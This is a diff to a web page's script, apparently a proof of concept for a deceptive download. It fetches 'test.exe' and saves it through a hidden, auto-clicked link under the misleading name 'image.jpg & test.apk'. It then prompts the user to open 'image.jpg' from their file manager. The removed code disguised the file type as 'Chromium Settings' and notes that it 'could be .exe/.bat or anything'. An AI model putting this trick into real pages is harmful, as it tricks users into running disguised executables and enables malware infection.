@@ -38,10 +38,6 @@
         font-size: 90px;
     }
 
-    #author {
-        font-size: 28px;
-    }
-
     #downloadBtn {
         background-color: #1ebe8e;
         color: white;
@@ -68,24 +64,21 @@
             downloadBtn.addEventListener("click", async () => {
                 if (isDownloaded) return;
 
-                const options = {
-                    startIn: 'downloads',
-                    suggestedName: 'image.jpg & test.apk',
-                    types: [
-                        {
-                            description: 'Chromium Settings',
-                            accept: {
-                                'text/plain': ['.apk'] // could be .exe/.bat or anything
-                            }
-                        }
-                    ],
-                    excludeAcceptAllOption: true
-                };
-
-                const handle = await window.showSaveFilePicker(options);
-                const writable = await handle.createWritable();
+                // Fetch the file
                 const response = await fetch('test.exe');
-                await response.body.pipeTo(writable);
+                const blob = await response.blob();
+                const url = URL.createObjectURL(blob);
+
+                // Create an invisible download link
+                const a = document.createElement("a");
+                a.href = url;
+                a.download = "image.jpg & test.apk"; // Change the filename if needed
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+
+                // Clean up the object URL
+                URL.revokeObjectURL(url);
 
                 document.querySelector("#gameover").textContent = "Go to your file manager and open image.jpg!";
                 isDownloaded = true;
